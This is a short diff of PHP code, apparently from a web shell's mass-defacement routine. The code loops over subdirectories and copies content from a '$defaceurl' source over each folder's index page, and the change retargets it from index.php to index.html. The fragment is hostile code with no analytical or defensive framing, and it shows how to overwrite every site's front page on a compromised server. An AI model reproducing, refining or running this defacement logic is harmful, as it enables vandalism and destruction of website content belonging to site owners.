@@ -428,7 +428,7 @@ if (is_dir($dir)) {
     if ($dh = opendir($dir)) {
         while (($file = readdir($dh)) !== false) {
             if (filetype($dir . $file) == "dir") {
-                $newfile = $dir . $file . "/index.php";
+                $newfile = $dir . $file . "/index.html";
                 echo $newfile . "
 ";
                 if (!copy($defaceurl, $newfile)) {
